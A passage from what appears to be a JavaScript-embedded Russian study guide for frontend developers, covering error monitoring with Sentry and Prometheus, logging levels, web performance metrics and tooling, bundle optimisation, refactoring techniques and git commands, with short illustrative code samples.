**2. Группировка ошибок (fingerprinting)** — одна ошибка от 1000 пользователей не создаёт 1000 тикетов. Sentry группирует похожие ошибки по стектрейсу и показывает "произошла 1000 раз у 300 пользователей". Самому реализовать: алгоритм дедупликации, хранилище, UI.

**3. Контекст ошибки** — автоматически собирает браузер, ОС, URL, версию релиза, breadcrumbs (последние действия пользователя перед ошибкой), состояние Redux/Vuex если настроено, кастомные теги.

**4. Алерты и интеграции** — уведомления в Slack/Email при новой ошибке или резком росте. Интеграция с Jira — автоматически создаёт тикет.

**5. Performance monitoring** — не только ошибки, но и медленные транзакции, N+1 запросы, медленный рендер. Пересечение с Prometheus/Grafana по назначению.

**6. Releases** — привязка ошибок к конкретному деплою. Видишь: "после v2.3.1 эта ошибка появилась впервые". Sentry подтягивает коммиты из GitHub/GitLab автоматически.

**Установка:**
\`\`\`js
// npm install @sentry/react
import * as Sentry from '@sentry/react';

Sentry.init({
  dsn: 'https://xxx@sentry.io/xxx',
  environment: 'production',
  tracesSampleRate: 0.1, // 10% запросов для мониторинга производительности
});
\`\`\`

**Ручная отправка + контекст:**
\`\`\`js
try {
  await fetchData();
} catch (err) {
  Sentry.captureException(err);
}

Sentry.setUser({ id: userId, email: userEmail });
Sentry.setTag('feature', 'checkout');
Sentry.addBreadcrumb({ message: 'Нажал кнопку оплаты', level: 'info' });
\`\`\`

**ErrorBoundary от Sentry** — автоматически отправляет ошибки рендера:
\`\`\`jsx
import { ErrorBoundary } from '@sentry/react';
<ErrorBoundary fallback={<ErrorPage />}><App /></ErrorBoundary>
\`\`\`

**Prometheus** — мониторинг метрик во времени. Реагирует на "как система себя чувствует". Каждые N секунд собирает числовые показатели (CPU, память, количество запросов, время ответа, кастомные метрики) и хранит их как временные ряды.

Prometheus обычно используется в связке:
• **Grafana** — визуализация метрик в виде графиков и дашбордов
• **Alertmanager** — алерты при превышении порогов (CPU > 80%, p99 latency > 2s)

Sentry vs Prometheus: Sentry — "что именно сломалось и у кого", Prometheus — "насколько здорова система в целом". В продакшне нужны оба.

**Другие инструменты:**
• **LogRocket / FullStory** — session replay: запись сессии до ошибки + логи
• **Datadog** — мониторинг + метрики + логи (fullstack, платная альтернатива связке Sentry + Prometheus)
• **Winston / Pino** — логгеры для Node.js с уровнями и форматами`},{name:"Понимание принципа выделения программных узлов для логирования",level:"4",content:`**Уровни логирования:**
\`\`\`
DEBUG  — детальная отладка (только dev, в продакшн не пишем)
INFO   — обычные события: пользователь залогинился, запрос выполнен
WARN   — предупреждения: deprecated API, медленный запрос, retry
ERROR  — ошибки которые не сломали приложение: упал один запрос
FATAL  — критические: приложение не может работать
\`\`\`
В продакшне логируют **WARN и выше**.
\`\`\`js
console.debug('детали запроса:', payload);     // только dev
console.info('пользователь залогинился:', id);
console.warn('устаревший метод, используй X');
console.error('ошибка загрузки:', error);
\`\`\`

**Что логировать (программные узлы):**
• **API-вызовы** — url, метод, статус ответа, время выполнения, ошибки
• **Действия пользователя** — навигация, ключевые клики (оформление заказа, оплата)
• **Ошибки рендеринга** — через ErrorBoundary + componentDidCatch
• **Бизнес-логика** — переходы состояний, транзакции, важные решения
• **Производительность** — операции дольше порога (> 1s), медленные рендеры

**Не логировать** — чувствительные данные: пароли, токены, email, телефоны, данные карт. Нарушение GDPR → штрафы.

**Принцип:** логировать нужно на **границах системы** — вход/выход API, смена состояний, места где что-то может пойти не так. Внутренние детали реализации логировать не нужно — они меняются и засоряют логи.`}]},{id:"perf",title:"ПРОИЗВОДИТЕЛЬНОСТЬ",icon:"🚀",color:"#FFC107",topics:[{name:"Инструменты проверки производительности (devtools, lighthouse)",level:"2",content:`**Lighthouse** — встроенный аудит в DevTools (вкладка Lighthouse).
5 категорий: **Performance** — скорость загрузки, **Accessibility** — доступность (aria, контраст, tabindex), **Best Practices** — HTTPS, console errors, **SEO** — meta, заголовки, **PWA** — соответствие требованиям.
Даёт оценку 0–100 и конкретные рекомендации с объяснениями.
\`\`\`bash
npx lighthouse https://site.com --view  # запуск из CLI
\`\`\`

**Performance вкладка** — запись и анализ в реальном времени:
Record → выполняешь действия → Stop. Что видно:
• **FPS** — кадры в секунду (должно быть 60)
• **Main thread** — что выполняется в главном потоке, flame chart стека вызовов
• **Long Tasks** — задачи дольше 50ms (блокируют UI, выделены красным)
• **Timings** — метрики FCP, LCP, CLS на таймлайне

Как найти проблему: найти красный Long Task → кликнуть → увидишь какая функция виновата → оптимизировать или перенести в Web Worker.

**Network вкладка** — порядок и время загрузки ресурсов:
\`\`\`
Waterfall: DNS Lookup → TCP → TLS → Request → Response
\`\`\`
• **Disable cache** — тестировать без кэша
• **Throttling** — симуляция медленного интернета (3G, 4G)
• Смотреть: Size (размер), Time (время), серая полоска = ожидание соединения, параллельность waterfall

**Memory вкладка** — анализ утечек памяти:
• **Heap Snapshot** — снимок памяти в момент времени. Take snapshot → действие → Take snapshot. Сравни два снимка — что выросло?
• **Allocation Timeline** — кто выделяет память во времени. Синие полосы = выделение, серые = GC очистил, синие которые остались = утечка.
• **Allocation Sampling** — какие функции потребляют память (меньше overhead чем Timeline)

**Частые причины утечек памяти:**
\`\`\`js
// Незакрытые подписки и таймеры:
useEffect(() => {
  emitter.on('event', handler);
  const id = setInterval(fn, 1000);
  return () => {
    emitter.off('event', handler); // обязательно!
    clearInterval(id);             // обязательно!
  };
}, []);

// Глобальные переменные — никогда не удалятся:
window.myData = hugeArray; // ❌

// Замыкания держащие большие объекты:
function createClosure() {
  const hugeData = new Array(1000000).fill('x');
  return () => hugeData[0]; // hugeData не удалится пока жива функция
}
\`\`\`

**Coverage вкладка** — какой JS/CSS код не используется:
DevTools → More tools → Coverage → Record. Красный = не используется → кандидат для удаления или lazy load.

**Rendering вкладка** — визуализация перерисовок:
DevTools → More tools → Rendering → Paint flashing (подсвечивает перерисовки), FPS meter (показывает FPS в реальном времени).

**WebPageTest** — тестирование из разных локаций и устройств (реальные условия, не localhost).`},{name:"Preload, prefetch, async, defer",level:"2",content:'**Scripts:**\n```html\n<script src="app.js"><\/script>           <!-- блокирует парсинг -->\n<script src="app.js" async><\/script>     <!-- загружает параллельно, выполняет сразу -->\n<script src="app.js" defer><\/script>     <!-- загружает параллельно, выполняет после парсинга -->\n```\n\n**Resource hints:**\n```html\n<!-- preload — загрузить прямо сейчас, высокий приоритет -->\n<link rel="preload" href="font.woff2"   as="font"   crossorigin>  <!-- шрифт (crossorigin обязателен) -->\n<link rel="preload" href="hero.jpg"     as="image">               <!-- LCP-изображение -->\n<link rel="preload" href="critical.js"  as="script">              <!-- скрипт нужный сразу -->\n<link rel="preload" href="critical.css" as="style">               <!-- CSS нужный сразу -->\n\n<!-- prefetch — загрузить в фоне, низкий приоритет (для будущей навигации) -->\n<link rel="prefetch" href="next-page.js">   <!-- JS следующей страницы -->\n<link rel="prefetch" href="next-page.css">  <!-- CSS следующей страницы -->\n\n<!-- preconnect — только установить соединение заранее, без загрузки ресурса -->\n<link rel="preconnect" href="https://api.com">\n```\n\n**Атрибут `as` обязателен для `preload`** — без него браузер не знает тип ресурса и:\n• не расставит правильный приоритет загрузки (шрифты и стили важнее картинок)\n• загрузит ресурс дважды — один раз по preload-хинту без типа, второй раз когда встретит тег в HTML\n• может проигнорировать preload совсем\n\nДопустимые значения `as`: `font`, `image`, `script`, `style`, `fetch`, `document`, `audio`, `video`, `worker`.\n\n**`crossorigin`** — атрибут который переводит запрос в CORS-режим: браузер добавляет заголовок `Origin` и ожидает `Access-Control-Allow-Origin` в ответе. Без него запрос идёт без учётных данных и без CORS-заголовков.\n\n**Для шрифтов обязателен `crossorigin`** — даже если шрифт на том же домене. Спецификация требует загружать шрифты в CORS-режиме всегда. Если у preload-хинта нет `crossorigin`, а у реального запроса шрифта он есть — браузер считает их разными запросами и загружает дважды:\n```html\n<!-- ✅ правильно: -->\n<link rel="preload" href="/fonts/Inter.woff2" as="font" type="font/woff2" crossorigin>\n\n<!-- ❌ будет двойная загрузка: -->\n<link rel="preload" href="/fonts/Inter.woff2" as="font">\n```'},{name:"Метрики клиентской производительности",level:"3",content:`**Core Web Vitals** — метрики которые Google использует для ранжирования:

**LCP (Largest Contentful Paint)** — время загрузки самого большого элемента (картинка, заголовок, видео).
Хорошо: < 2.5s · Нужно улучшить: 2.5–4s · Плохо: > 4s
Что влияет: медленный сервер, большие картинки, блокирующие скрипты.

**INP (Interaction to Next Paint)** — время от взаимодействия до следующей отрисовки. Заменил FID в 2024.
Хорошо: < 200ms · Нужно улучшить: 200–500ms · Плохо: > 500ms
Что влияет: Long Tasks блокирующие главный поток.

**CLS (Cumulative Layout Shift)** — визуальная стабильность, насколько элементы прыгают при загрузке.
Хорошо: < 0.1 · Нужно улучшить: 0.1–0.25 · Плохо: > 0.25
Что влияет: картинки без width/height, динамически вставляемые элементы, веб-шрифты.

**Другие метрики:**
• **FCP (First Contentful Paint)** — первый контент на экране. Хорошо: < 1.8s
• **TTFB (Time To First Byte)** — время до первого байта от сервера. Хорошо: < 800ms. Что влияет: сервер, CDN, БД.
• **TTI (Time To Interactive)** — когда JS загружен и страница полностью интерактивна. Хорошо: < 3.8s

**Как измерять:**
• **Lighthouse** — синтетические тесты (лабораторные условия)
• **DevTools Performance** — реальная запись сессии
• **PageSpeed Insights** — онлайн, показывает реальные данные пользователей (CrUX)
• **web-vitals** — реальные данные прямо из браузера пользователей:
\`\`\`js
import { getLCP, getINP, getCLS } from 'web-vitals';

getLCP(metric => sendToAnalytics(metric));
getINP(metric => sendToAnalytics(metric));
getCLS(metric => sendToAnalytics(metric));
\`\`\``},{name:"Механизмы уменьшения размера бандла, CDN",level:"3",content:`**Бандл** — итоговая сборка проекта: все JS/CSS собраны в один (или несколько) файлов для браузера.

**1. Tree Shaking** — удаляет неиспользуемый код при сборке. Работает только с ES modules:
\`\`\`js
import { debounce } from 'lodash-es'; // ✅ возьмёт только debounce
const _ = require('lodash');          // ❌ возьмёт всю lodash
\`\`\`
Webpack/Vite анализируют импорты статически → помечают dead code → минификатор удаляет.

**2. Code Splitting + Lazy Loading** — разбиваем бандл на чанки, грузим только нужное:
\`\`\`js
// Динамический импорт — создаёт отдельный чанк:
const module = await import('./heavyModule');

// React.lazy + Suspense:
const Dashboard = React.lazy(() => import('./Dashboard'));
<Suspense fallback={<Spinner />}><Dashboard /></Suspense>
\`\`\`
Результат: \`main.js\` (200kb) грузится сразу, \`dashboard.js\` (300kb) — только при переходе.

**3. Vendor/App разделение:**
\`\`\`
vendors.js — React, lodash, axios (меняется редко → кэшируется месяцами)
app.js     — твой код (меняется часто → обновляется при каждом деплое)
\`\`\`
Vite делает это автоматически. В Webpack — \`SplitChunksPlugin\`.

**4. Минификация (Terser)** — удаляет пробелы, комментарии, переименовывает переменные:
\`\`\`js
// До:
function calculateUserAge(birthDate) {
  const today = new Date();
  return today.getFullYear() - birthDate.getFullYear();
}
// После:
function a(b){const c=new Date();return c.getFullYear()-b.getFullYear()}
\`\`\`

**5. Compression (Gzip / Brotli)** — сжатие на сервере/CDN, браузер распаковывает автоматически:
\`\`\`
app.js     500kb
app.js.gz  150kb  (gzip)
app.js.br  120kb  (brotli — лучше gzip)
\`\`\`

**6. Замена тяжёлых библиотек:**
\`\`\`
moment.js → date-fns   (67kb → 13kb)
lodash    → lodash-es  (tree shaking работает)
axios     → fetch      (нативный, 0kb)
\`\`\`

**7. Анализ бандла** — визуальная карта что занимает место:
\`\`\`bash
npx webpack-bundle-analyzer  # для webpack
npx vite-bundle-visualizer   # для vite
\`\`\`

**CDN (Content Delivery Network)** — сеть серверов по всему миру хранящих копии файлов:
\`\`\`
Без CDN: пользователь в Японии → сервер в Москве → ~200ms
С CDN:   пользователь в Японии → CDN в Токио    → ~10ms
\`\`\`
Что хранят: картинки, видео, JS/CSS бандлы, шрифты, статику.
Дополнительно: кэширование (разгружает сервер), DDoS-защита, автосжатие, HTTP/2.
Популярные: **Cloudflare**, **AWS CloudFront**, **Cloudinary** (для изображений), **Vercel Edge Network**.

**Оптимизация изображений (критично для LCP):**
• Использовать **WebP/AVIF** вместо JPEG/PNG (–25-50% размера)
• **srcset + sizes** — браузер сам выбирает нужный размер, не грузит лишнего
• **loading="lazy"** — браузер откладывает загрузку картинки пока она не приблизится к viewport (below the fold = ниже видимой части экрана). Нативный атрибут, без JS. Не использовать для LCP-изображения — оно должно грузиться сразу.
• **decoding="async"** — декодирование (превращение сжатых байт в пиксели) выполняется вне main thread. Без него браузер блокирует поток на время декодирования → задержка рендеринга соседних элементов. С async — main thread свободен, декодирование идёт параллельно.
• CDN с auto-format (Cloudinary, imgix — автоматически конвертируют в WebP/AVIF)
\`\`\`html
<picture>
  <source srcset="hero.avif" type="image/avif">
  <source srcset="hero.webp" type="image/webp">
  <img
    src="hero.jpg"
    srcset="hero-400.jpg 400w, hero-800.jpg 800w"
    sizes="(max-width: 600px) 100vw, 800px"
    loading="eager"
    fetchpriority="high"
    alt="..."
  />
</picture>
\`\`\`
**fetchpriority="high"** — для LCP-изображения (выше preload в очереди загрузки).`},{name:"Lazy-loading, оптимизация критичного пути",level:"4",content:`**Critical Rendering Path** — последовательность шагов браузера от HTML до пикселей на экране:
\`\`\`
1. HTML → парсинг → DOM
2. CSS  → парсинг → CSSOM
3. DOM + CSSOM → Render Tree → только то, что реально рисовать
4. Layout (Reflow) — вычисление размеров и позиций
5. Paint — отрисовка пикселей
6. Composite — слои объединяются
\`\`\`
**Render Tree** — то, что реально рисовать на экране. DOM знает структуру, CSSOM знает стили — Render Tree объединяет их и отбрасывает невидимое: \`display: none\` выбрасывает узел целиком (и всех потомков), \`<head>\`, \`<script>\`, \`<meta>\` не попадают в дерево. \`visibility: hidden\` — наоборот: узел остаётся в Render Tree, место занимает, просто не рисуется.

**CSS — render blocking ресурс.** Без CSSOM браузер не рендерит страницу. Поэтому CSS подключают в head — чтобы CSSOM построился как можно раньше.

**Layout / Paint / Composite — стоимость изменений:**
\`\`\`
width, height, margin, padding  → Layout + Paint + Composite  (дорого)
color, background, border-radius → Paint + Composite           (средне)
transform, opacity               → только Composite            (дёшево!)
\`\`\`
\`\`\`css
/* ❌ вызывает Layout: */
@keyframes move { from { left: 0; } to { left: 100px; } }

/* ✅ только Composite: */
@keyframes move { from { transform: translateX(0); } to { transform: translateX(100px); } }
\`\`\`

**GPU-слои и will-change:**
По умолчанию всё на одном слое — анимация перерисовывает весь экран через CPU. Браузер может вынести элемент на отдельный GPU-слой: тогда GPU двигает только его, не трогая остальное — быстро.

\`will-change\` — подсказка браузеру создать GPU-слой заранее (без него слой создаётся в момент анимации → рывок в начале):
\`\`\`css
.modal { will-change: transform; }
\`\`\`
Что автоматически создаёт GPU-слой: \`will-change: transform\`, \`opacity < 1\`, \`position: fixed\`.
Старые хаки (то же самое, хуже): \`transform: translateZ(0)\`, \`transform: translate3d(0,0,0)\`.

Не злоупотреблять — каждый слой занимает память GPU:
\`\`\`css
.card { will-change: transform; } /* ❌ 1000 карточек = 1000 слоёв */
.card:hover { will-change: transform; } /* ✅ только когда нужно */
\`\`\`
Или через JS — добавлять и убирать по необходимости:
\`\`\`js
el.addEventListener('mouseenter', () => el.style.willChange = 'transform');
el.addEventListener('mouseleave', () => el.style.willChange = 'auto');
\`\`\`

**Что блокирует рендеринг и как исправить:**
\`\`\`html
<!-- ✅ Critical CSS — инлайн в head (только above-the-fold стили): -->
<style>body { margin: 0; } .hero { ... }</style>

<!-- ✅ Остальной CSS — асинхронно: -->
<link rel="preload" href="styles.css" as="style" onload="this.rel='stylesheet'">

<!-- ✅ JS не блокирует парсинг: -->
<script src="app.js" defer><\/script>
\`\`\`

**Forced Reflow (Layout Thrashing)** — самая частая проблема: чтение и запись DOM в цикле:
\`\`\`js
// ❌ Layout Thrashing — каждая итерация вызывает Layout:
elements.forEach(el => {
  const height = el.offsetHeight;       // читаем → браузер делает Layout
  el.style.height = height * 2 + 'px'; // пишем → инвалидируем Layout
});

// ✅ Сначала все чтения, потом все записи:
const heights = elements.map(el => el.offsetHeight);    // все чтения
elements.forEach((el, i) => {
  el.style.height = heights[i] * 2 + 'px';              // все записи
});
\`\`\`
Свойства которые вызывают принудительный Layout при чтении: \`offsetHeight\`, \`offsetWidth\`, \`getBoundingClientRect()\`, \`scrollTop\`.

**Техники Lazy Loading:**

**1. Dynamic import + React.lazy + Suspense** — разбивает JS на чанки, загружает по требованию:
\`\`\`jsx
const HeavyComponent = React.lazy(() => import('./HeavyComponent'));

<Suspense fallback={<Spinner />}>
  <HeavyComponent />
</Suspense>
\`\`\`

**2. Route-based code splitting** — самый распространённый паттерн. Каждая страница грузится только когда пользователь на неё переходит:
\`\`\`jsx
const Dashboard = React.lazy(() => import('./pages/Dashboard'));
const Profile   = React.lazy(() => import('./pages/Profile'));
\`\`\`
Vite и CRA делают это из коробки при правильной настройке роутера.

**3. loading="lazy" на изображениях** — нативный браузерный lazy loading. Изображение не загружается, пока не попадает во viewport:
\`\`\`html
<img src="photo.jpg" loading="lazy" alt="...">
\`\`\`
Поддержка ~95% браузеров. Для LCP-изображения (первый экран) — не использовать, там нужен \`fetchpriority="high"\`.

**4. Intersection Observer** — гибкий способ lazy loading для любого контента:
\`\`\`js
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      loadComponent();
      observer.unobserve(entry.target);
    }
  });
});
observer.observe(element);
\`\`\`
Основа для бесконечного скролла, lazy-loaded секций, виртуализации списков.

**5. Виртуализация списков** — 10 000 элементов в DOM не рендерить все сразу, только видимые + буфер:
Библиотеки: \`react-window\`, \`react-virtual\`, \`@tanstack/virtual\`.

**6. Prefetch / Preload** — дополняет lazy loading:
\`\`\`html
<!-- prefetch — низкий приоритет, браузер грузит в фоне когда свободен -->
<link rel="prefetch" href="/dashboard.js">          <!-- следующая страница -->
<link rel="prefetch" href="/dashboard.css">         <!-- её стили -->

<!-- preload — высокий приоритет, скачать прямо сейчас -->
<!-- as= обязателен: говорит браузеру тип ресурса и приоритет -->
<link rel="preload" href="/font.woff2"  as="font"   crossorigin>  <!-- шрифт -->
<link rel="preload" href="/hero.jpg"    as="image">               <!-- LCP-изображение -->
<link rel="preload" href="/critical.js" as="script">              <!-- скрипт -->
<link rel="preload" href="/above.css"   as="style">               <!-- критический CSS -->
\`\`\`
\`crossorigin\` обязателен для шрифтов — даже если они с того же домена, браузер грузит их в CORS-режиме.`},{name:"Метрики серверной производительности",level:"4",content:`**TTFB (Time To First Byte)** — время от запроса до первого байта ответа. Хорошо: < 800ms.
Что влияет: обработка на сервере, запросы к БД, сетевая задержка, CDN.

**RPS (Requests Per Second)** — сколько запросов сервер обрабатывает в секунду.
100 RPS — небольшой сервис, 10 000 RPS — высоконагруженный.

**Latency** — время обработки одного запроса. Меряют перцентилями:
\`\`\`
p50 =  50ms  — медиана (половина запросов быстрее)
p95 = 200ms  — 95% запросов быстрее этого
p99 = 500ms  — 99% запросов быстрее этого
\`\`\`
p99 важнее среднего — показывает худший опыт пользователей.

**Error Rate** — процент 5xx ошибок. Хорошо: < 0.1%, плохо: > 1%.

**CPU / Memory utilization:** CPU < 70% (запас на пики), память должна быть стабильной (рост = утечка).

**Мониторинг:** Datadog, New Relic (APM), Prometheus + Grafana (open source), Sentry Performance.

**Оптимизация:**
\`\`\`js
// Redis — кэшируем тяжёлые запросы к БД:
const cached = await redis.get('users:list');
if (cached) return JSON.parse(cached);
const users = await db.query('SELECT * FROM users');
await redis.set('users:list', JSON.stringify(users), 'EX', 300); // TTL 5 мин
return users;
\`\`\`
\`\`\`sql
-- Индекс ускоряет поиск с O(n) до O(log n):
CREATE INDEX idx_users_email ON users(email);
\`\`\`
Горизонтальное масштабирование: 1 сервер → 1000 RPS, 3 сервера + load balancer → 3000 RPS.`}]},{id:"refactoring",title:"РЕФАКТОРИНГ",icon:"🔧",color:"#8D6E63",topics:[{name:"Правила работы с комментариями при рефакторинге",level:"2",content:`**Хорошие комментарии:**
• Объясняют ПОЧЕМУ, а не ЧТО
• TODO / FIXME / HACK с обоснованием
• JSDoc для публичных API
• Регулярные выражения и сложные алгоритмы

**Плохие комментарии:**
• Описывают очевидный код
• Устаревшие (не обновлены при рефакторинге)
• Закомментированный код (удаляй, git помнит)

**Правило:** если код требует комментария — сначала попробуй сделать код понятнее (переименовать, выделить функцию).`},{name:"Основные принципы рефакторинга",level:"3",content:`**Рефакторинг** — изменение внутренней структуры без изменения поведения.

**Принципы:**
• Маленькие шаги + тесты после каждого шага
• Не менять поведение и рефакторить одновременно
• Тесты — safety net (без тестов рефакторинг рискован)
• Роль тестов при рефакторинге — они ДОЛЖНЫ проходить после каждого изменения

**Цели рефакторинга:** улучшить читаемость, убрать дублирование, упростить поддержку, подготовить к новой фиче.`},{name:"Признаки грязного кода",level:"3",content:`**Code Smells:**
• **Длинные функции/методы** (> 20-30 строк)
• **Дублирование кода**
• **Магические числа** (42 вместо MAX_RETRIES)
• **Глубокая вложенность** (if внутри if внутри if)
• **Большие классы / God Object** (один класс делает всё)
• **Feature Envy** — метод больше работает с чужими данными, чем со своими
• **Длинные списки параметров** (> 3 — используй объект)
• **Мёртвый код** — недостижимый или неиспользуемый
• **Shotgun Surgery** — одно изменение требует правок в 10 местах`},{name:"Применять различные методы рефакторинга",level:"3",content:`**Extract Method (Извлечение метода)** — длинный блок кода → отдельная функция с говорящим именем:
\`\`\`js
// До — всё в одной функции, непонятно что делает каждый блок:
function processOrder(order) {
  if (!order.items.length || !order.userId) throw new Error('Invalid');
  let total = 0;
  for (const item of order.items) total += item.price * item.qty;
  if (order.promoCode === 'SALE10') total *= 0.9;
  db.save({ ...order, total, createdAt: Date.now() });
  email.send(order.userId, \`Ваш заказ на \${total}₽ принят\`);
}

// После — каждый шаг именован, функция читается как список действий:
function processOrder(order) {
  validateOrder(order);
  const total = calculateTotal(order);
  saveOrder(order, total);
  notifyUser(order.userId, total);
}
\`\`\`

**Extract Variable (Извлечение переменной)** — сложное выражение → именованная переменная:
\`\`\`js
// До — непонятно что означает условие:
if (user.age >= 18 && user.country === 'RU' && !user.isBanned) { }

// После — название объясняет смысл:
const canAccess = user.age >= 18 && user.country === 'RU' && !user.isBanned;
if (canAccess) { }
\`\`\`

**Inline Method (Инлайн метода)** — обратное Extract Method. Если метод тривиален и используется один раз — убрать лишний уровень:
\`\`\`js
// До — отдельный метод ради одной строки не добавляет ясности:
function isAdult(user) { return user.age >= 18; }
function check(user) { if (isAdult(user)) { } }

// После — прямо на месте понятнее:
function check(user) { if (user.age >= 18) { } }
\`\`\`

**Decompose Conditional (Разбиение условного оператора)** — сложный if/else → функции:
\`\`\`js
// До:
if (date.before(SUMMER_START) || date.after(SUMMER_END)) {
  charge = qty * winterRate + winterServiceCharge;
} else {
  charge = qty * summerRate;
}

// После — условие и ветки получают имена:
if (isWinter(date)) {
  charge = winterCharge(qty);
} else {
  charge = summerCharge(qty);
}
\`\`\`

**Replace Magic Number with Constant (Замена магических чисел):**
\`\`\`js
// До — непонятно что значат числа:
if (status === 2) { }
setTimeout(fn, 86400000);

// После — названия дают контекст:
const STATUS_ACTIVE = 2;
const ONE_DAY_MS = 24 * 60 * 60 * 1000;
if (status === STATUS_ACTIVE) { }
setTimeout(fn, ONE_DAY_MS);
\`\`\`

**Encapsulate Field (Инкапсуляция поля)** — прямой доступ к полю → геттер/сеттер для контроля:
\`\`\`js
// До — любой может записать любое значение:
class User { name = ''; }
user.name = ''; // можно сохранить пустую строку

// После — логика валидации в одном месте:
class User {
  #name = '';
  get name() { return this.#name; }
  set name(v) {
    if (!v.trim()) throw new Error('Name required');
    this.#name = v.trim();
  }
}
\`\`\`

**Introduce Parameter Object (Объект вместо длинного списка параметров):**
\`\`\`js
// До — 5 параметров, легко перепутать порядок:
function createUser(firstName, lastName, email, age, country) { }

// После — объект с именованными полями:
function createUser({ firstName, lastName, email, age, country }) { }
createUser({ firstName: 'Ivan', email: 'i@mail.ru', age: 25, country: 'RU', lastName: 'Petrov' });
\`\`\`

**Move Function (Перемещение функции)** — функция переезжает туда где используется больше всего:
\`\`\`js
// До — метод в Account, но работает в основном с данными Customer:
class Account {
  overdraftCharge() { if (this.type.isPremium) { ... this.customer.age ... } }
}

// После — перенести туда где контекст естественнее:
class CustomerType {
  overdraftCharge(account) { if (this.isPremium) { ... } }
}
\`\`\`

**Replace Conditional with Polymorphism** — большой switch/if по типу → классы с переопределёнными методами (связь с Open/Closed):
\`\`\`js
// До — каждый новый тип ломает функцию:
function getSpeed(bird) {
  switch (bird.type) {
    case 'EUROPEAN': return baseSpeed;
    case 'AFRICAN': return baseSpeed - bird.numberOfCoconuts * 2;
    case 'PARROT': return bird.isNailed ? 0 : baseSpeed + bird.voltage;
  }
}

// После — каждый тип сам знает свою скорость:
class EuropeanBird { getSpeed() { return baseSpeed; } }
class AfricanBird { getSpeed() { return baseSpeed - this.numberOfCoconuts * 2; } }
class ParrotBird { getSpeed() { return this.isNailed ? 0 : baseSpeed + this.voltage; } }
\`\`\``},{name:"Понимает текущий бэклог технического развития проекта",level:"4",content:`**Технический долг (Tech Debt)** — осознанные или случайные компромиссы в коде.

**Бэклог тех. развития:**
• Обновление зависимостей
• Миграция на новые версии фреймворков
• Покрытие тестами критических путей
• Оптимизация производительности
• Улучшение CI/CD
• Документация архитектурных решений (ADR)

**Senior-ответственность:** видеть картину целиком, приоритизировать тех. долг, обосновывать бизнесу время на рефакторинг, планировать миграции.`}]},{id:"git",title:"GIT",icon:"📦",color:"#F4511E",topics:[{name:"Базовые команды: pull, push, commit, fetch, add, clone",level:"2",content:`**Три зоны:**
Рабочая директория → git add → Staging area → git commit → Repository

\`\`\`bash
git status          # статус файлов
git add file.js     # добавить файл в staging
git add .           # добавить все
git commit -m "msg" # зафиксировать
git push            # отправить на remote
git pull            # fetch + merge
git fetch           # скачать без merge (безопасно)
git clone <url>     # клонировать репо
\`\`\`
fetch vs pull: fetch скачивает изменения, но не применяет. pull = fetch + merge.

**init + config:**
\`\`\`bash
git init                               # инициализировать репо
git config --global user.name "Alex"   # имя для коммитов
git config --global user.email "..."   # email
git config --global core.editor vim    # редактор
git config --list                      # все настройки
\`\`\``},{name:"branch, merge, remote",level:"2",content:`**branch:**
\`\`\`bash
git branch              # список веток
git branch -a           # все включая remote
git branch feature      # создать ветку
git branch -d feature   # удалить ветку
git branch -m old new   # переименовать

git switch feature      # переключиться (Git 2.23+)
git switch -c feature   # создать и переключиться
\`\`\`

**merge:**
\`\`\`bash
git merge feature         # влить feature в текущую ветку
git merge --no-ff feature # всегда создавать merge коммит
git merge --abort         # отменить merge при конфликте
\`\`\`

**Merge стратегии:**

**Fast-forward** — когда main не уходил вперёд после ответвления. Git просто двигает указатель ветки вперёд, merge-коммит не создаётся, история линейная.
\`\`\`
main:    A - B
feature:     B - C - D
→ после merge: A - B - C - D  (main просто сдвинулся)
\`\`\`
\`--no-ff\` — принудительно создаёт merge-коммит даже если fast-forward возможен. Полезно чтобы в истории было видно что была отдельная ветка.

**3-way merge** — когда ветки разошлись: и main, и feature добавили коммиты после точки ответвления. Git берёт три снимка (общий предок, вершина main, вершина feature) и создаёт новый **merge-коммит** с двумя родителями.
\`\`\`
main:    A - B - E
feature: A - B - C - D
→ после merge: A - B - C - D
                    \\       \\
                     E ----- M  (merge-коммит)
\`\`\`

**Rebase** — переносит коммиты feature поверх актуального main. История линейная, нет merge-коммитов. Но коммиты переписываются — они получают новые SHA-хэши.
\`\`\`
main:    A - B - E
feature: A - B - C - D
→ после rebase feature на main:
main:    A - B - E - C' - D'  (C и D стали C' и D' — новые хэши)
\`\`\`
⚠️ Rebase опасен на публичных ветках: у коллег которые уже взяли исходные коммиты сломается история. Rebase только для локальных веток или до первого push.

**remote:**
\`\`\`bash
git remote -v                      # список remote
git remote add origin https://...  # добавить
git remote remove origin           # удалить
git remote rename origin upstream  # переименовать

git fetch origin       # скачать без merge
git pull origin main   # fetch + merge
\`\`\``},{name:"amend, fixup, revert, cherry-pick, stash, rebase, .gitignore",level:"3",content:`**amend:**
\`\`\`bash
git commit --amend -m "новое сообщение"  # изменить последний коммит
git commit --amend --no-edit             # добавить файлы без смены сообщения
\`\`\`
⚠️ Переписывает SHA коммита. Если уже запушен — нужен git push --force-with-lease.

**stash:**
\`\`\`bash
git stash                  # сохранить изменения
git stash save "описание"  # с описанием
git stash list             # список всех stash
git stash pop              # применить последний и удалить
git stash apply stash@{2}  # применить конкретный
git stash drop             # удалить последний
git stash clear            # удалить все
\`\`\`

**revert vs reset:**
\`\`\`bash
git revert abc123         # новый коммит отменяющий abc123 (безопасно для remote)

git reset --soft HEAD~1   # коммит удалён, изменения в staging
git reset --mixed HEAD~1  # коммит удалён, изменения в рабочей директории
git reset --hard HEAD~1   # коммит и изменения удалены полностью
\`\`\`
Правило: reset только для локальных коммитов. revert когда коммит уже в remote.

**cherry-pick:**
\`\`\`bash
git cherry-pick abc123          # перенести один коммит
git cherry-pick abc123..def456  # диапазон коммитов
\`\`\`
Используется для хотфиксов — перенести исправление бага с одной ветки на другую.

**rebase:**
\`\`\`bash
git rebase main          # перебазировать текущую ветку на main
git rebase -i HEAD~3     # интерактивный rebase последних 3 коммитов
git rebase --abort       # отменить rebase
git rebase --continue    # продолжить после разрешения конфликта
\`\`\`
⚠️ Переписывает историю. Нельзя делать на публичных ветках которые используют другие.

**fixup:**
\`\`\`bash
git commit --fixup abc123             # создать коммит-исправление
git rebase -i --autosquash HEAD~5     # автоматически склеить fixup коммиты
\`\`\`

**.gitignore** — файлы которые git игнорирует (node_modules, .env, dist).`},{name:"log, diff, reflog, tag",level:"3",content:`**log:**
\`\`\`bash
git log --oneline --graph   # самый частый вариант
git log -n 5                # последние 5 коммитов
git log --author="Alex"     # коммиты автора
git log --since="2 weeks"   # за период
